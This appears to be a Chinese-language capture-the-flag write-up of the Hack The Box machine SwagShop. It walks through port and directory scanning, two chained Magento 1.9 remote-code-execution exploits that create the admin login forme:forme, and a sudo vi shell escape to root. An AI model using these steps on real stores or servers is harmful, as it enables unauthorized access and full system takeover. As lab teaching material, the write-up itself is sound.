        <content type="html"><![CDATA[<p><code>vi</code> <code>Magento</code></p><h1 id="0-Enumeration"><a href="#0-Enumeration" class="headerlink" title="0-Enumeration"></a>0-Enumeration</h1><p>Port scanning using nmap.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -n -v -sS -sC -sV -T4 -p- 10.10.10.140 --max-retries=0</span><br></pre></td></tr></table></figure><p>The result is as follows:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)</span><br><span class="line">|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)</span><br><span class="line">|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST</span><br><span class="line">|_http-title: Did not follow redirect to http://swagshop.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 09:56</span><br><span class="line">Completed NSE at 09:56, 0.00s elapsed</span><br><span class="line">Initiating NSE at 09:56</span><br><span class="line">Completed NSE at 09:56, 0.00s elapsed</span><br><span class="line">Initiating NSE at 09:56</span><br><span class="line">Completed NSE at 09:56, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 369.76 seconds</span><br><span class="line">           Raw packets sent: 65583 (2.886MB) | Rcvd: 80270 (5.630MB)</span><br></pre></td></tr></table></figure><p>访问 10.10.10.140， 可以看到跳转至了swapshop.htb,本机不知道swapshop.htb的地址，因此跳转后的页面无法访问，因此需要更改hosts文件<br>hosts文件时IP地址和Hostname的对应关系<br>在进行dns请求之前，需要访问hosts文件，抢在DNS服务器之前将域名解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\drivers\etc</span><br></pre></td></tr></table></figure><p>更改内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.140            swagshop.htb</span><br></pre></td></tr></table></figure><p>80端口开放，尝试对目录进行扫描，并没有什么值得关心的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">[09:51:08] Starting:</span><br><span class="line">[09:51:14] 301 -  309B  - /js  -&gt;  http://10.10.10.140/js/</span><br><span class="line">[09:51:31] 403 -  277B  - /.ht_wsr.txt</span><br><span class="line">[09:51:31] 403 -  277B  - /.htaccess.bak1</span><br><span class="line">[09:51:31] 403 -  277B  - /.htaccess.orig</span><br><span class="line">[09:51:31] 403 -  277B  - /.htaccess.save</span><br><span class="line">[09:51:31] 403 -  277B  - /.htaccess.sample</span><br><span class="line">[09:51:31] 403 -  277B  - /.htaccessBAK</span><br><span class="line">[09:51:31] 403 -  277B  - /.htaccess_orig</span><br><span class="line">[09:51:31] 403 -  277B  - /.htaccessOLD</span><br><span class="line">[09:51:31] 403 -  277B  - /.htaccess_sc</span><br><span class="line">[09:51:31] 403 -  277B  - /.htaccess_extra</span><br><span class="line">[09:51:32] 403 -  277B  - /.htaccessOLD2</span><br><span class="line">[09:51:32] 403 -  277B  - /.html</span><br><span class="line">[09:51:32] 403 -  277B  - /.htm</span><br><span class="line">[09:51:32] 403 -  277B  - /.htpasswd_test</span><br><span class="line">[09:51:32] 403 -  277B  - /.httr-oauth</span><br><span class="line">[09:51:32] 403 -  277B  - /.htpasswds</span><br><span class="line">[09:51:40] 403 -  277B  - /.php</span><br><span class="line">[09:51:40] 403 -  277B  - /.php3</span><br><span class="line">[09:52:09] 200 -   10KB - /LICENSE.txt</span><br><span class="line">[09:53:35] 200 -   37B  - /api.php</span><br><span class="line">[09:53:35] 301 -  310B  - /app  -&gt;  http://10.10.10.140/app/</span><br><span class="line">[09:53:35] 403 -  277B  - /app/.htaccess</span><br><span class="line">[09:53:35] 200 -    2KB - /app/</span><br><span class="line">[09:53:36] 200 -    2KB - /app/etc/local.xml.template</span><br><span class="line">[09:53:36] 200 -    2KB - /app/etc/local.xml</span><br><span class="line">[09:53:36] 200 -    5KB - /app/etc/config.xml</span><br><span class="line">[09:53:36] 200 -    9KB - /app/etc/local.xml.additional</span><br><span class="line">[09:54:02] 200 -  717B  - /cron.sh</span><br><span class="line">[09:54:02] 200 -    0B  - /cron.php</span><br><span class="line">[09:54:13] 301 -  313B  - /errors  -&gt;  http://10.10.10.140/errors/</span><br><span class="line">[09:54:13] 200 -    2KB - /errors/</span><br><span class="line">[09:54:18] 200 -    1KB - /favicon.ico</span><br><span class="line">[09:54:30] 301 -  315B  - /includes  -&gt;  http://10.10.10.140/includes/</span><br><span class="line">[09:54:30] 200 -  946B  - /includes/</span><br><span class="line">[09:54:32] 302 -    0B  - /index.php  -&gt;  http://swagshop.htb/</span><br><span class="line">[09:54:33] 302 -    0B  - /index.php/login/  -&gt;  http://swagshop.htb/</span><br><span class="line">[09:54:34] 200 -   44B  - /install.php</span><br><span class="line">[09:54:37] 301 -  318B  - /js/tiny_mce  -&gt;  http://10.10.10.140/js/tiny_mce/</span><br><span class="line">[09:54:37] 200 -    4KB - /js/tiny_mce/</span><br><span class="line">[09:54:41] 301 -  310B  - /lib  -&gt;  http://10.10.10.140/lib/</span><br><span class="line">[09:54:41] 200 -    3KB - /lib/</span><br><span class="line">[09:54:51] 301 -  312B  - /media  -&gt;  http://10.10.10.140/media/</span><br><span class="line">[09:54:51] 200 -    2KB - /media/</span><br><span class="line">[09:55:09] 200 -  886B  - /php.ini.sample</span><br><span class="line">[09:55:16] 301 -  314B  - /pkginfo  -&gt;  http://10.10.10.140/pkginfo/</span><br><span class="line">[09:55:28] 403 -  277B  - /server-status</span><br><span class="line">[09:55:28] 403 -  277B  - /server-status/</span><br><span class="line">[09:55:30] 301 -  312B  - /shell  -&gt;  http://10.10.10.140/shell/</span><br><span class="line">[09:55:30] 200 -    2KB - /shell/</span><br><span class="line">[09:55:35] 301 -  311B  - /skin  -&gt;  http://10.10.10.140/skin/</span><br><span class="line">[09:56:03] 301 -  310B  - /var  -&gt;  http://10.10.10.140/var/</span><br><span class="line">[09:56:03] 200 -    2KB - /var/</span><br><span class="line">[09:56:03] 200 -  755B  - /var/backups/</span><br><span class="line">[09:56:03] 200 -    4KB - /var/cache/</span><br><span class="line">[09:56:04] 200 -    9KB - /var/package/</span><br></pre></td></tr></table></figure><h1 id="1-Magento"><a href="#1-Magento" class="headerlink" title="1-Magento"></a>1-Magento</h1><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>注意到给页面采用的是Maegento框架，有一个面向此框架的扫描工具Magscan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php magescan.phar scan:all http://swagshop.htb</span><br></pre></td></tr></table></figure><p> 结果如下<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  Magento Information</span><br><span class="line">+-----------+------------------+</span><br><span class="line">| Parameter | Value            |</span><br><span class="line">+-----------+------------------+</span><br><span class="line">| Edition   | Community        |</span><br><span class="line">| Version   | 1.9.0.0, 1.9.0.1 |</span><br><span class="line">+-----------+------------------+</span><br></pre></td></tr></table></figure><br>确认了版本为1.9.0.0</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用searchsploit来查找和Magento相关的漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">searchsploit magento</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                      |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                        | php/webapps/38573.txt</span><br><span class="line">eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                             | php/webapps/38651.txt</span><br><span class="line">Magento 1.2 - &#x27;/app/code/core/Mage/Admin/Model/Session.php?login[&#x27;Username&#x27;]&#x27; Cross-Site Scripting                                  | php/webapps/32808.txt</span><br><span class="line">Magento 1.2 - &#x27;/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email&#x27; Cross-Site Scripting                            | php/webapps/32809.txt</span><br><span class="line">Magento 1.2 - &#x27;downloader/index.php&#x27; Cross-Site Scripting                                                                           | php/webapps/32810.txt</span><br><span class="line">Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                      | php/webapps/39838.php</span><br><span class="line">Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution                                                                        | php/webapps/37811.py</span><br><span class="line">Magento eCommerce - Local File Disclosure                                                                                           | php/webapps/19793.txt</span><br><span class="line">Magento eCommerce - Remote Code Execution                                                                                           | xml/webapps/37977.py</span><br><span class="line">Magento eCommerce CE v2.3.5-p2 - Blind SQLi                                                                                         | php/webapps/50896.txt</span><br><span class="line">Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                              | php/webapps/35996.txt</span><br><span class="line">Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                         | php/webapps/35052.txt</span><br><span class="line">Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                                                        | php/webapps/48135.php</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>我们可以先使用<code>Magento eCommerce - Remote Code Execution</code>再使用<code>Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution</code>来形成完整利用链<br>下载脚本，进行简单修改至python3版本,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Check http://swagshop.htb/index.php/admin with creds forme:forme</span><br></pre></td></tr></table></figure><p>使用默认用户名和密码登录<a href="http://swagshop.htb/index.php/admin">http://swagshop.htb/index.php/admin</a><br>再尝试使用另外一个脚本来获取权限，但是该脚本存在一些问题，尝试修复无极而返,但是在github上我们可以搜寻到另外一个可行的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- [0xBruno](https://github.com/0xBruno)/</span><br><span class="line">- [MagentoCE_1.9.0.1_Authenticated_RCE](https://github.com/0xBruno/MagentoCE_1.9.0.1_Authenticated_RCE)</span><br></pre></td></tr></table></figure><p>获取她，并对内容进行修改，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 exploit.py http://swagshop.htb/index.php/admin</span><br><span class="line">[*] Getting form_key... tXaIJGGsKx33EumH</span><br><span class="line">[*] Logging in as forme:forme</span><br><span class="line">[*] Finding secret key... 0457719dc00764eb0b8ac2f9c777357c</span><br><span class="line">[*] Navigating to dashboard...</span><br><span class="line">[*] Getting ajaxBlockUrl... http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/830b03ffb558243b135762e6284a6049/</span><br><span class="line">[*] Getting new FORM_KEY... W4LmPndKarMCWY2h</span><br><span class="line">[*] Getting tunnel URL... http://swagshop.htb/index.php/admin/dashboard/tunnel/key/0f9a8d9417317186d187242219849441/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Happy Hacking!</span><br></pre></td></tr></table></figure><h1 id="2-权限提升"><a href="#2-权限提升" class="headerlink" title="2-权限提升"></a>2-权限提升</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries for www-data on swagshop:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on swagshop:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/vi /var/www/html/*</span><br></pre></td></tr></table></figure><p>非常常见的vi提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/vi /var/www/html/php.ini.sample -c &#x27;:!/bin/bash&#x27;</span><br></pre></td></tr></table></figure><p>试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/vi /var/www/html/* -c &#x27;:!/bin/bash&#x27;</span><br></pre></td></tr></table></figure><p>即可获取权限</p><h1 id="3-Summary"><a href="#3-Summary" class="headerlink" title="3-Summary"></a>3-Summary</h1><ul><li>修改hosts文件</li><li>Magento<ul><li>扫描工具 Magescan</li><li>Magento RCE漏洞</li></ul></li><li>vi提权</li></ul>]]></content>
      
      
      
